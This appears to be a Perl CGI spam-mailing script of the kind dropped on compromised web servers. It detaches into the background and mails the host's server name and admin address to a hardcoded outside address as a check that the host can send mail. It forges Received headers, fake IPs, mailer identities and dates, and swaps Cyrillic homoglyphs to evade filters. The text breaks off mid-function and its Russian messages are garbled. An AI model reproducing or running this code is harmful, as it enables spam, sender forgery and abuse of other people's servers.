#!/usr/bin/perl -w

	use strict;
	use Sys::Hostname;
	use POSIX qw(setsid);
	use Errno qw(EINPROGRESS);
	use IO::Socket qw(:DEFAULT :crlf);
	use IO::Select;

print "Content-type: text/plain; charset=windows-1251\n\n" if $ENV{HTTP_USER_AGENT};

	my $line = 'ryglman@yahoo.com';
	my $domainsss = $ENV{'SERVER_NAME'};
	my $fromsss = $ENV{'SERVER_ADMIN'};
	my %s = (
	dns		=> undef,
	cmd		=> '',
	mode		=>
			{
		send	=> 'Ðàññûëêà'
			}
	);

	my %c = (

	addr		=> $ENV{'SERVER_ADDR'},
	name		=> $ENV{'SERVER_NAME'},

	from		=> 'admin@mail.com',
	replyto		=> 'demo@mail.com',
	subject		=> 'Hello!',
	letter		=> 'hfgyv',
	
	dns			=> '128.8.76.2',
	threads		=> 1,
	timeout		=> 5,

	charset		=> 'windows-1251',
	mailer		=> 'outlook',
	priority	=> 'normal',

	proxyer		=> 1,
	
	local		=> hostname || 'localhost',

	fakedate	=> 'no',
	fakefrom	=> 'no',
	exctname	=> 'no',
	ucinname	=> 'no',

	mode		=> 'send',
	);

	$c{'mode'} = 'send';

&sendmail;

sub sendmail
{
	
	return undef unless defined (my $child = fork);
	
	return if $child != 0;

		setsid;

		chdir './';

		umask (0);

	$s{'dns'} = gethostbyname ($c{'dns'});

	unless (defined $s{'dns'}) {

		my $s = $s{'mode'}{$c{'mode'}};
		my $e =''; $e = "à" if $c{'mode'} == 'send';

		}

	$s{'dns'} = pack ('S n a4 x8', PF_INET, 53, $s{'dns'});

	&child;
}

sub child
{
	
		my ($email, $name, $addr, $info) = &mailpar($line);
		
		unless ($email)
		{
			next;
		}
		
		my ($domain) = $addr =~ m!\@(.*)!;
		
		my ($mx, $err) = &getmx($domain);
		
		unless ($mx)
		{
			next;
		}
		
		if ($mx =~ m!^\d$! && $mx == 1)
		{
			next;
		}

		my ($sock, $resp, $proxy);


			($sock, $err) = &tcpcon($mx, 25, $c{'timeout'});
			

			($resp, $err) = &readsmtp($sock);
			
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^(4|5)/)
			{
				close $sock;
			}

			my $helo = $c{'local'};
			my $from = $fromsss;
			my ($fname, $faddr) = (&mailpar($from))[1, 2];
			my ($frec, $fdom) = split (/\@/, $faddr);

			if ($c{'fakefrom'} eq 'yes')
			{
				$faddr = "$frec\@$helo" if $helo ne 'localhost';
			}

			my $lastcmd;

			($resp, $err) = &sendsmtp($sock, "HELO $helo");
			unless ($resp)
			{
				close $sock;
			}

			$lastcmd = $resp;

			($resp, $err) = &readsmtp($sock);
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^(4|5)/)
			{
				close $sock;
			}

			($resp, $err) = &sendsmtp($sock, "MAIL FROM: <$faddr>");
			unless ($resp)
			{
				close $sock;
			}

			$lastcmd = $resp;

			($resp, $err) = &readsmtp($sock);
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^(4|5)/)
			{
				close $sock;
			}

			($resp, $err) = &sendsmtp($sock, "RCPT TO: <$addr>");
			unless ($resp)
			{
				close $sock;
			}

			$lastcmd = $resp;

			($resp, $err) = &readsmtp($sock);
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^5/)
			{
				close $sock;
			}

			if ($resp =~ /^4/)
			{
				close $sock;
			}

			($resp, $err) = &sendsmtp($sock, "DATA");
			unless ($resp)
			{
				close $sock;
			}

			$lastcmd = $resp;

			($resp, $err) = &readsmtp($sock);
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^(4|5)/)
			{
				close $sock;
			}

			my $message = &message($helo, $name, $addr, $fname, $faddr, $info);
			$message .= $CRLF . '.';

			($resp, $err) = &sendsmtp($sock, $message);
			unless ($resp)
			{
				close $sock;
			}

			($resp, $err) = &readsmtp($sock);
			unless ($resp)
			{
				close $sock;
			}

			if ($resp =~ /^(4|5)/)
			{
				close $sock;
			}

			($resp, $err) = &sendsmtp($sock, "QUIT");
			unless ($resp)
			{
				
				close $sock;
			}
			else
			{
				($resp, $err) = &readsmtp($sock);
				close $sock;
			}


  print "Jm73uZ";
	exit (0);
}


sub sendsmtp
{
	my ($sock, $cmd) = @_;

	my $s = IO::Select->new($sock);

	if ($s->can_write($c{'timeout'})) {

		print $sock $s{'cmd'}, $cmd, $CRLF; 
		
	}

	else {

		return (undef, "Âðåìÿ îæèäàíèÿ îòâåòà èñòåêëî"); }

	return &chomp($cmd);
}

sub readsmtp
{
	my $sock = shift;
	my $line;

	my $clrl = sub { $_ = &chomp(shift); $_ .= "\x01" };

	my $s = IO::Select->new($sock);

	if ($s->can_read($c{'timeout'})) {

		$line = <$sock>;

		unless ($line && $line =~ m!^\d\d\d!) {

			return (undef, "Ñåðâåð âåðíóë íåðàñïîçíàííûé îòâåò"); }

		$line = $clrl->($line);

		if ($line =~ s/^(\d\d\d)-/$1 /) {

			my $next = <$sock>;

			while ($next =~ s/^\d\d\d-//) {

				$next = $clrl->($next);

				$line .= $next;
				$next = <$sock>; }

		$next =~ s/^\d\d\d //;

		$next = $clrl->($next);

		$line .= $next; } }

	else {

		return (undef, "Âðåìÿ îæèäàíèÿ îòâåòà èñòåêëî"); }

	return $line;
}

sub chomp
{
	my $ln = shift;

	$ln =~ s/^\s*([^\s]?.*)$/$1/; $ln =~ s/^(.*[^\s])\s*$/$1/;

	return $ln;
}

sub urldecode
{
	my ($str) = @_;
	$str =~ s/\+/ /g;
	$str =~ s/%([0-9a-hA-H]{2})/pack ('C', hex ($1))/ge;
	return $str;
}

sub reaper
{
	while (my $kid = waitpid (-1, 1)) { last if $kid == -1; }

	$SIG{CHLD} = \&reaper;
}

sub getln
{
	my $path = shift;

	return undef unless (my $size = (stat ($path))[7]);

	my $addr;

	open (F, $path);

		flock (F, 1);

		seek (F, my $pos = int rand ($size + 1), 0);

		while ($pos > 0) {

			read (F, $addr, 1);

			last if $addr eq "\n";

			$pos=0 if ($pos -= 2) < 0;

			seek (F, $pos, 0); }

		$addr = <F>;

	close F;

	return &chomp($addr);
}


sub mailpar
{
	my $e = shift;

	$e = &chomp($e);

	return unless $e =~ m!^[^\@]+\@[^\@]+\.[^\@]+$!;

	my ($n, $a, $i) = $e =~ m!(.*?)[\s\|<]*([^\s|<]+\@[^>]+)\b\|?(.*)$!;
	return unless $a; return unless $a =~ m!\@[\d\w]!;
	$n ||= (split (/\@/, $a))[0];

	if ($c{'ucinname'} eq 'yes') {

		my $u = substr ($n, 0, 1);
		$u =~ tr/\x60-\x7F\xE0-\xFF/\x40-\x5F\xC0-\xDF/;
		substr ($n, 0, 1) = $u; }

	$a =~ s/(.*\.\w+)(.*)$/$1/; $i |= $2;

	$i = '' unless $i =~ /\|/;
	$i =~ s/^.*?\|(.*)/$1/g;

	return ($e, $n, $a, $i);
}

sub tcpcon
{
	my ($host, $port, $timeout) = @_;

	my $sock = IO::Socket::INET->new(Proto=>'tcp', Type=>SOCK_STREAM);

	return (undef, "Íåâîçìîæíî ñîçäàòü ñîêåò.") unless $sock;

	my $addr = gethostbyname ($host);

	unless ($addr) {

		close $sock;

		return (undef, "Õîñò $host íå ñóùåñòâóåò."); }

	$sock->blocking(0);

	unless (connect ($sock, pack ("S n a4 x8", AF_INET, $port, $addr))) {

		unless ($! == EINPROGRESS) {

			close $sock;

			return (undef, "Íåâîçìîæíî óñòàíîâèòü ñîåäèíåíèå."); }

		my $s = IO::Select->new($sock);

		unless ($s->can_write($timeout)) {

			close $sock;

			return (undef, "Âðåìÿ îæèäàíèÿ îòâåòà èñòåêëî."); }

		unless ($sock->connected) {

			close $sock;

			return (undef, "Íåâîçìîæíî óñòàíîâèòü ñîåäèíåíèå."); } }

	$sock->blocking(1);
	$sock->autoflush(1);

	unless ($sock) { return (undef, "Íåèçâåñòíàÿ îøèáêà ïîäêëþ÷åíèÿ"); }

	return $sock;
}

sub getmx
{
	my $domain = shift;

	my $sock = IO::Socket::INET->new(Proto=>'udp');

	return (1, "Íåâîçìîæíî ñîçäàòü ñîêåò.") unless $sock;

	my $packid = int rand 0xFFFF;
	my $answer;

	my ($query, $offset) = &dnsquery($packid, $domain);

		$sock->send($query, 0, $s{'dns'});

	my $s = IO::Select->new($sock);

	if ($s->can_read($c{'timeout'})) {

		$sock->recv($answer, 512); }

	else {

		close $sock;

		return (1, "Âðåìÿ îæèäàíèÿ îòâåòà èñòåêëî."); }

	close $sock;

	my ($err, $mx) = &dnsanswer($packid, $answer, $offset);

	return (1, $mx) if $err =~ m!^(1|2|4|5)$!;

	if ($err == 6) {

		($sock, $err) = &tcpcon($domain, 25, 1);

		return (undef, $mx) unless $sock;

		close $sock;

		$mx = gethostbyname ($domain);

		return (undef, $mx) unless defined $mx;

		$mx = join ('.', unpack ('C4', $mx));

		$err = 0; }

	return (undef, $mx) if $err;

	return $mx;
}

sub dnsquery
{
	my ($packid, $domain) = @_;

	my $query = pack ('n S n4', $packid, 0x1, 0x1, 0x0, 0x0, 0x0);

	foreach (split (/\./, $domain)) {

		$query .= pack ('C', length ($_)) . $_; }

	$query .= pack ('C n2', 0x0, 0xF, 0x1);

	return ($query, length ($query));
}

sub dnsanswer
{
	my ($packid, $answer, $offset) = @_;

	my %error = (

	1 => "Íåäîïóñòèìûé ðàçìåð äàííûõ â îòâåòå DNS ñåðâåðà.",
	2 => "Íàðóøåíà ñèíõðîíèçàöèÿ ðàáîòû ñ DNS ñåðâåðîì.",
	3 => "Çàïðàøèâàåìûé äîìåí íå ñóùåñòâóåò.",
	4 => "Òåêóùèé çàïðîñ îòêëîíåí DNS ñåðâåðîì.",
	5 => "Óêàçàííûé DNS ñåðâåð íå ïîääåðæèâàåò ðåêóðñèþ.",
	6 => "MX çàïèñåé äëÿ çàïðàøèâàåìîãî äîìåíà íå íàéäåíî."

	);

		return (1, $error{1}) if length ($answer) < 12;

		@_ = unpack ('n C2 n4', $answer);

		my %header = (

		id		=> $_[0],
		qr		=> ($_[1] >> 7) & 0x1,
		opcode		=> ($_[1] >> 3) & 0xF,
		aa		=> ($_[1] >> 2) & 0x1,
		tc		=> ($_[1] >> 1) & 0x1,
		rd		=> $_[1] & 0x1,
		ra		=> ($_[2] >> 7) & 0x1,
		z		=> ($_[2] >> 4) & 0x6,
		rcode		=> $_[2] & 0xF,
		qdcount		=> $_[3],
		ancount		=> $_[4],
		nscount		=> $_[5],
		arcount		=> $_[6]

		);

	return (2, $error{2}) if $header{'id'} != $packid;
	return (3, $error{3}) if $header{'rcode'} == 3;
	return (4, $error{4}) if $header{'rcode'} != 0;

	return (5, $error{5}) unless $header{'ra'};
	return (6, $error{6}) unless $header{'ancount'};

	return (1, $error{1}) if length ($answer) < $offset;

		my %answer;
		my %mx;

	foreach (1..$header{'ancount'}) {

		($answer{'name'}, $offset) = &dnsextract($answer, $offset);

		if (!defined $answer{'name'} ||	length ($answer) < $offset + 10) {
			return (1, $error{1}); }

		($answer{'type'}, $answer{'class'}, $answer{'ttl'}, $answer{'rdlength'})
			= unpack ('n2 N n', substr ($answer, $offset, 10));

		if (length ($answer) < $offset + $answer{'rdlength'} + 10) {
			return (1, $error{1}); }

		$answer{'priority'} = unpack ('n', substr ($answer, $offset + 10, 2));

		($answer{'mx'}, $offset) = &dnsextract($answer, $offset + 12);

		return (1, $error{1}) unless defined $answer{'mx'};

		if ($answer{'type'} == 15) { $mx{$answer{'mx'}} = $answer{'priority'}; } }

	my $mx = (sort {$mx{$a} <=> $mx{$b}} keys %mx)[0];

	return (6, $error{6}) unless defined $mx;

	$mx = gethostbyname ($mx);

	return (6, $error{6}) unless defined $mx;

	$mx = join ('.', unpack ('C4', $mx));

	return (0, $mx);
}

sub dnsextract
{
	my ($packet, $offset) = @_;
	my ($name, $len) = ('', '');

	while (1) {

		return (undef, undef) if length ($packet) < ($offset + 1);

		$len = unpack ("\@$offset C", $packet);

		if ($len == 0) {

			$offset ++; last; }

		elsif (($len & 0xC0) == 0xC0) {

			return (undef, undef) if length ($packet) < ($offset + 2);

			my $ptr = unpack ("\@$offset n", $packet);
			$ptr &= 0x3FFF;
			my ($name2) = &dnsextract($packet, $ptr);

			return (undef, undef) unless defined $name2;

			$name .= $name2; $offset += 2; last; }

		else {

			$offset ++;
			return (undef, undef) if length ($packet) < ($offset + $len);

			my $elem = substr ($packet, $offset, $len);
			$elem =~ s/\./\\./g; $name .= "$elem."; $offset += $len; } }

	$name =~ s/\.$//;
	return ($name, $offset);
}

sub tags
{
	my $str = shift;

	$$str =~ s/\[cyrlat\]([^\[]*)\[\/cyrlat\]/&tagcyrlat($1)/ge;

	$$str =~ s/(\[random[^\]]*\])/&tagrandom($1)/ge;

	$$str =~ s/(\[fromfile[^\]]*\])/&tagfromfile($1)/ge;
}

sub tagcyrlat
{
	my $str = shift || return '';

	$str =~ tr/\xE0\xE5\xEA\xEC\xEE/\x61\x65\x6B\x6D\x6F/;
	$str =~ tr/\xEF\xF0\xF1\xF3\xF5/\x6E\x70\x63\x79\x78/;

	$str =~ tr/\xC0\xC2\xC5\xC7\xCA\xCC/\x41\x42\x45\x33\x4B\x4D/;
	$str =~ tr/\xCD\xCE\xD0\xD1\xD2\xD5/\x48\x4F\x50\x43\x54\x58/;

	return $str;
}

sub tagrandom
{
	my $tag = shift;

	my ($min, $max) = (1, 8);

	my %chars = (num=>[0..9], lat=>['a'..'z', 'A'..'Z',0..9,'`','-','=','~','!','@','$','%','^', '&','*','(',')','_','+','{','}','|',':','"','<','>',' ',chr(0x0a),chr(0x0d)], rus=>[0xE0..0xFF]);

	my @lang; my @chars = ();

	$min = $1 if $tag =~ /min=(\d+)/; $max = $1 if $tag =~ /max=(\d+)/;

	if ($tag =~ /lang=((lat|rus)\+?(lat|rus)?\b)/) {

		my $lang = $1;

		push (@lang, @{$chars{'lat'}}) if $lang =~ /lat/;

		push (@lang, map { chr } @{$chars{'rus'}}) if $lang =~ /rus/; }

	if ($tag =~ /case=((lc|uc|num)\b\+?(lc|uc|num)?\+?(lc|uc|num)?\b)/) {

		my $case = $1;

		if (scalar @lang) {

			push (@chars, @{$chars{'num'}}) if $case =~ /num/;

			push (@chars, @lang) if $case =~ /lc/;

			push (@chars, map { tr/\x60-\x7F\xE0-\xFF/\x40-\x5F\xC0-\xDF/; $_ }
			@lang) if $case =~ /uc/; } }

	$min = $max = 0 if $min > $max; my $z = 1; $z = 0 unless $min;

	my $x = $min; $x = $max - $min + 1 if $min == $max;

	my $y = int (rand ($max - $min + $z)) + $min;

	unless (scalar @chars) { push (@chars, @{$chars{'num'}}, @{$chars{'lat'}}); }

	join ('', @chars[map { rand @chars } ($x..$y)]);
}

sub tagfromfile
{
	my $tag = shift;

	my $file = ''; $file = $1 if $tag =~ /src=(.*)\b/;

	my $line = &getln($file) if -f $file; $line ||= '';
}

sub message
{
	my ($host, $toname, $toaddr, $fromname, $fromaddr, $info) = @_;

	my ($header, $headernum);

	if ($c{'mailer'} ne "outlook") {
		($header, $headernum) = &header($c{'mailer'}); }
	else {
		($header, $headernum) = &header('outlookna'); }

	my ($fakeip, $fakename) = &ip;

	my ($date) = &date(0);
	my ($fakedate, $faketime) = &date(31536000);

	my ($messageid, $boundary, $cid) = &messageid(1, $fakename);

	my @xpriority = &xpriority($c{'priority'});
	my ($xprionum, $xpriotxt) = @xpriority[0, 2];

	my $replyto = $fromsss;
	my ($replyname, $replyaddr) = (&mailpar($replyto))[1, 2];

	my $subject = $domainsss;

	#&tags(\$subject);

	my $letterfile = $c{'letter'};

	my $contenttype = 'text/plain';
	$contenttype = 'text/html' if $letterfile =~ /\.(htm|html)$/;

	my $charset = {win=>'windows-1251', koi=>'koi8-r', iso=>'iso-8859-5'};
	$charset = $charset->{$c{'charset'}} ||= $c{'charset'};

	my $contentenc = '8bit';

	my $message = $c{'letter'};

	#&tags(\$message);

	#my $cell = sub {

	#	my $cn = shift;

	#	my @cell = ($toaddr);

	#	foreach (split (/\|/, $info)) { $_ = &chomp ($_) || ''; push (@cell, $_); }

	#	return $cell[$cn] || ''; };

	# $message =~ s/\%cell(\d+)\%/$cell->($1)/iges;

	my %files;

	if ($c{'charset'} eq 'koi') {

		$toname = &encbase64(&wintokoi($toname), $charset);
		$fromname = &encbase64(&wintokoi($fromname), $charset);
		$replyname = &encbase64(&wintokoi($replyname), $charset);

		$subject = &encbase64(&wintokoi($subject), $charset);
		$message = &wintokoi($message); }

	elsif ($c{'charset'} eq 'iso') {

		$toname = &encbase64(&wintoiso($toname), $charset);
		$fromname = &encbase64(&wintoiso($fromname), $charset);
		$replyname = &encbase64(&wintoiso($replyname), $charset);

		$subject = &encbase64(&wintoiso($subject), $charset);
		$message = &wintoiso($message); }

	unless ($headernum) {

		($messageid, $boundary, $cid) = &messageid(0, $fromaddr, $faketime);

		$xprionum = $xpriority[1]; }

	else {

		$contentenc = 'quoted-printable'; }

	$fakedate = $date if $c{'fakedate'} eq 'no';
	$fromname = $replyname = $toname = '' if $c{'exctname'} eq 'no';

	$header =~ s/%FAKENAME%/$fakename/;
	$header =~ s/%FAKEIP%/$fakeip/;
	$header =~ s/%HOST%/$host/;
	$header =~ s/%DATE%/$date/;
	$header =~ s/%FAKEDATE%/$fakedate/;
	$header =~ s/%MESSAGE_ID%/$messageid/;
	$header =~ s/%X_PRIORITYNUM%/$xprionum/;
	$header =~ s/%X_PRIORITYTXT%/$xpriotxt/;

	$header =~ s/%FROMNAME%/$fromname/;
	$header =~ s/%FROMADDR%/$fromaddr/;
	$header =~ s/%REPLY_TONAME%/$replyname/;
	$header =~ s/%REPLY_TOADDR%/$replyaddr/;
	$header =~ s/%TONAME%/$toname/;
	$header =~ s/%TOADDR%/$toaddr/;
	$header =~ s/%SUBJECT%/$subject/;

	$header =~ s/%BOUNDARY%/$boundary/g;
	$header =~ s/%CONTENT_TYPE%/$contenttype/;
	$header =~ s/%CHARSET%/$charset/;
	$header =~ s/%CONTENT_ENCODING%/$contentenc/;

	my ($attach, $attcnt) = ('', 0);

	foreach my $file (keys %files) {

		$attcnt ++;

		my $newcid = $cid . sprintf "%08d", $attcnt;

		$attach .= "\n--" . $boundary . "\n";

		my $ctype = &ctype($file);

		my $fname = $file;

		$fname = &encbase64(&wintokoi($fname), $charset) if $c{'charset'} eq 'koi';
		$fname = &encbase64(&wintoiso($fname), $charset) if $c{'charset'} eq 'iso';

		$attach .= "Content-Type: ";

		unless ($headernum) {

			$attach .= uc $ctype . "; ";
			$attach .= 'name="' . $fname . '"' . "\n";

			if ($message =~ /$file/ && $contenttype eq 'text/html') {

				$newcid .= '_csseditor';
				$message =~ s/$file/cid:$newcid/g;

				$attach .= "Content-ID: <" . $newcid . ">\n";
				$attach .= "Content-transfer-encoding: base64\n"; }

			else {

				$attach .= "Content-transfer-encoding: base64\n";
				$attach .= "Content-Disposition: attachment; filename=";
				$attach .= '"' . $fname . '"' . "\n"; } }

		else {

			$attach .= $ctype . ";\n\t";
			$attach .= 'name="' . $fname . '"' . "\n";
			$attach .= "Content-Transfer-Encoding: base64\n";

			if ($message =~ /$file/ && $contenttype eq 'text/html') {

				$newcid .= '@' . $fakename;
				$message =~ s/$file/cid:$newcid/g;

				$attach .= "Content-ID: <" . $newcid . ">\n"; }

			else {

				$attach .= "Content-Disposition: attachment;\n\t";
				$attach .= 'filename="' . $fname . '"' . "\n"; } }

		$attach .= "\n$files{$file}"; }

	$message = &encquoted($message) if $headernum;

	$message .= $attach;

	$header =~ s/%MESSAGE%/$message/;

	$header =~ s/\n/$CRLF/g;

	return $header;
}

sub ip
{
	my @ip; for (1..4) { push (@ip, int rand 256); } @_ = ('a'..'z');
	return (join ('.', @ip), join ('', @_[map { rand @_ } (0..((int rand 6) + 2))]));
}

sub date
{
	my $date = localtime (time - int rand shift);

	$date =~ s/^(\w+)\s+(\w+)\s+(\d+)\s+(\d+:\d+:\d+)\s+(\d+)$/$1, $3 $2 $5 $4/;

	my %month = (Jan=>'01',Feb=>'02',Mar=>'03',Apr=>'04',May=>'05',Jun=>'06',
	Jul=>'07',Aug=>'08',Sep=>'09',Oct=>'10',Nov=>'11',Dec=>'12');

	my $time = $5 . $month{$2} . (sprintf "%02d", $3) . join ('', split (':', $4));

	return ("$date " . &gmtdiff, $time);
}

sub gmtdiff
{
	my $time = time;
	my @local = (localtime ($time))[2, 1, 3, 4, 5];
	my @gm = (gmtime ($time))[2, 1, 3, 4, 5];

	my $diffdate = ($gm[4] * 512 * 32 + $gm[3] * 32 + $gm[2]) <=>
	($local[4] * 512 * 32 + $local[3] * 32 + $local[2]);

	if ($diffdate > 0) { $gm[0] += 24; } elsif ($diffdate < 0) { $local[0] += 24; }

	my ($hourdiff, $mindiff) = ($gm[0] - $local[0]);

	if (abs ($gm[1] - $local[1]) < 5) {
		$mindiff = 0; }
	elsif (abs (abs ($gm[1] - $local[1]) - 30) <5) {
		$mindiff = 30; }
	elsif (abs (abs ($gm[1] - $local[1]) - 60) <5) {
		$mindiff = 0; $hourdiff ++; }

	return ($hourdiff < 0 ? '+' : '-') . sprintf "%02d%02d", abs ($hourdiff), $mindiff;
}

sub messageid
{
	my ($mailer, $fakename, $faketime) = @_;
	my ($messageid, $boundary, $cid);

	if ($mailer) {

		my $gr1 = sprintf "%03d", int rand 10;
		my $gr2 = sprintf "%01X", int rand 16;
		my $gr3 = sprintf "%04X", int rand 65536;
		my $gr4 = sprintf "%04X", int rand 65536;
		my $gr5 = sprintf "%04X", int rand 65536;
		my $gr6 = sprintf "%04X", int rand 65536;
		my $gr7 = sprintf "%04X", int rand 65536;

		$messageid .= $gr1 . lc ($gr2) . '01c4' . lc ($gr3) . '$' .
		lc ($gr4) . lc ($gr5) . '$' . lc ($gr6) . lc ($gr7) . '@' . $fakename;

		$boundary .= '----=_NextPart_000_' . $gr1 . (sprintf "%01X", int rand 16) .
		'_01C4' . $gr7 . '.' . $gr6 . $gr5;

		$cid .= $gr1 . lc ($gr2) . '01c4' . lc ($gr3) . '$' .
		lc ($gr4) . lc ($gr5) . '$';

		return ($messageid, $boundary, $cid); }

	@_ = (0..9);
	my $gr1 = join ('', @_[map { rand @_ } (0..((int rand 3) + 7))]);

	@_ = ('A'..'F', 0..9);
	my $gr2 = join ('', @_[map { rand @_ } (0..((int rand 5) + 9))]);

	$messageid = $gr1 . '.' . $faketime . '@' . (split (/\@/, $fakename))[1];
	$boundary = '----------' . $gr2;

	for (1..3) { $cid .= (join ('', @_[map { rand @_ } (0..7)]) . '.'); }

	return ($messageid, $boundary, $cid);
}

sub xpriority
{
	my $lev = shift;
	substr ($lev, 0, 1) = uc substr ($lev, 0, 1);

	my %lev = (Low=>[5, 4], Normal=>[3, 3], High=>[1, 2]);
	$lev = (keys %lev)[int rand keys %lev] unless defined $lev && exists $lev{$lev};

	return (@{$lev{$lev}}, $lev);
}

sub encbase64
{
	my ($enc, $charset) = @_;

	$charset = '=?' . $charset . '?B?';
	my @out; my $ptr = 0; my $str;

	while (my $chr = substr ($enc, $ptr ,1)) {

		$str .= $chr; $ptr ++;

		if (length ($str) == 18) {

			push (@out, $charset . (&base64($str, '')) .  "?="); $str = ''; } }

	push (@out, $charset . (&base64($str, '')) .  "?=") if length ($str);

	return join ("\n\t", @out);
}

sub base64 ($;$)
{
	my $res = '';
	my $eol = $_[1];

	$eol = "\n" unless defined $eol;
	pos ($_[0]) = 0;
	while ($_[0] =~ /(.{1,45})/gs) { $res .= substr (pack ('u', $1), 1); chop ($res); }

	$res =~ tr|` -_|AA-Za-z0-9+/|;
	my $padding = (3 - length ($_[0]) % 3) % 3;
	$res =~ s/.{$padding}$/'=' x $padding/e if $padding;
	if (length $eol) { $res =~ s/(.{1,76})/$1$eol/g; }

	return $res;
}

sub encquoted
{
	my $enc = &quoted($_[0]);

	if (length ($enc) < 74) { $enc =~ s/^\.$/=2E/g; $enc =~ s/^From /=46rom /g; }

	$enc;
}

sub quoted ($)
{
	my $res = shift;

	$res =~ s/([^ \t\n!"#\$%&'()*+,\-.\/0-9:;<>?\@A-Z[\\\]^_`a-z{|}~])/sprintf("=%02X",
	ord ($1))/eg; $res =~ s/([ \t]+)$/join ('', map { sprintf ("=%02X", ord ($_)) }
	split ('', $1))/egm;

	my $brokenlines = ''; $brokenlines .= "$1=\n" while $res =~ s/(.*?^[^\n]{73} (?:
	[^=\n]{2} (?! [^=\n]{0,1} $)|[^=\n] (?! [^=\n]{0,2} $)|(?! [^=\n]{0,3} $)))//xsm;

	$brokenlines . $res;
}

sub wintokoi
{
	my $str = shift;

	my $win =

	"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7".
	"\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF".
	"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7".
	"\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF".
	"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7".
	"\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF".
	"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7".
	"\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF";

	my $koi =

	"\xE1\xE2\xF7\xE7\xE4\xE5\xF6\xFA".
	"\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0".
	"\xF2\xF3\xF4\xF5\xE6\xE8\xE3\xFE".
	"\xFB\xFD\xFF\xF9\xF8\xFC\xE0\xF1".
	"\xC1\xC2\xD7\xC7\xC4\xC5\xD6\xDA".
	"\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0".
	"\xD2\xD3\xD4\xD5\xC6\xC8\xC3\xDE".
	"\xDB\xDD\xDF\xD9\xD8\xDC\xC0\xD1";

	eval "\$str=~tr/$win/$koi/;";

	return $str;
}

sub wintoiso
{
	my $str = shift;

	my $win =

	"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7".
	"\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF".
	"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7".
	"\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF".
	"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7".
	"\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF".
	"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7".
	"\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF";

	my $iso =

	"\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7".
	"\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF".
	"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7".
	"\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF".
	"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7".
	"\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF".
	"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7".
	"\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF";

	eval "\$str=~tr/$win/$iso/;";

	return $str;
}

sub header
{
	my $idx = shift;

my $thebat = <<'OBJ';
Received: from %FAKENAME% (%FAKEIP%)
	by %HOST%; %DATE%
Date: %FAKEDATE%
From: %FROMNAME% <%FROMADDR%>
X-Mailer: The Bat! (v2.01)
Reply-To: %REPLY_TONAME% <%REPLY_TOADDR%>
X-Priority: %X_PRIORITYNUM% (%X_PRIORITYTXT%)
Message-ID: <%MESSAGE_ID%>
To: %TONAME% <%TOADDR%>
Subject: %SUBJECT%
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="%BOUNDARY%"

--%BOUNDARY%
Content-Type: %CONTENT_TYPE%; charset=%CHARSET%
Content-Transfer-Encoding: %CONTENT_ENCODING%

%MESSAGE%
--%BOUNDARY%--

OBJ

my $outlook = <<'OBJ';
Received: from %FAKENAME% (%FAKEIP%)
	by %HOST%; %DATE%
Message-ID: <%MESSAGE_ID%>
Reply-To: %REPLY_TONAME% <%REPLY_TOADDR%>
From: %FROMNAME% <%FROMADDR%>
To: %TONAME% <%TOADDR%>
Subject: %SUBJECT%
Date: %FAKEDATE%
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="%BOUNDARY%"
X-Priority: %X_PRIORITYNUM%
X-MSMail-Priority: %X_PRIORITYTXT%
X-Mailer: Microsoft Outlook Express 6.00.2800.1158
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1165

--%BOUNDARY%
Content-Type: %CONTENT_TYPE%;
        charset="%CHARSET%"
Content-Transfer-Encoding: %CONTENT_ENCODING%

%MESSAGE%
--%BOUNDARY%--

OBJ

my $outlookna = <<'OBJ';
Received: from %FAKENAME% (%FAKEIP%)
	by %HOST%; %DATE%
Message-ID: <%MESSAGE_ID%>
Reply-To: %REPLY_TONAME% <%REPLY_TOADDR%>
From: %FROMNAME% <%FROMADDR%>
To: %TONAME% <%TOADDR%>
Subject: %SUBJECT%
Date: %FAKEDATE%
MIME-Version: 1.0
Content-Type: %CONTENT_TYPE%;
        charset="%CHARSET%"
Content-Transfer-Encoding: %CONTENT_ENCODING%
X-Priority: %X_PRIORITYNUM%
X-MSMail-Priority: %X_PRIORITYTXT%
X-Mailer: Microsoft Outlook Express 6.00.2800.1158
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1165

%MESSAGE%
OBJ

	my @header = ($thebat, $outlook);

	my $header = {thebat=>0, outlook=>1, random=>int rand scalar @header};

	my $select = $header->{$idx};

	return ($outlookna, 1) if $idx eq "outlookna";

	return ($header[$select], $select);
}

sub ctype
{
	my $ext = shift;

	my %ctype = (

	HTML		=> 'text/html',
	HTM		=> 'text/html',
	SHTM		=> 'text/html',
	SHTML		=> 'text/html',
	TXT		=> 'text/plain',
	PREF		=> 'text/plain',
	AIS		=> 'text/plain',
	RTX		=> 'text/richtext',
